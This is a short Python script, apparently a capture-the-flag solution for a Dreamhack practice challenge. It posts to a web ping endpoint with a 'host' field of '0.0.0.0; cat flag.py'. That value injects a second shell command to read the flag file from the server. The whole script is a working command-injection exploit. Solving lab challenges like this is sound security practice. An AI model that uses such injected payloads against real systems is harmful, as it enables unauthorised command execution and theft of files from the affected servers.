import requests

port = 13499
url_index = f"http://host3.dreamhack.games:{port}/"
url_ping = url_index + "ping"

param = {"host": "0.0.0.0; cat flag.py"}

r = requests.post(url_ping, data=param)
print(r.text)
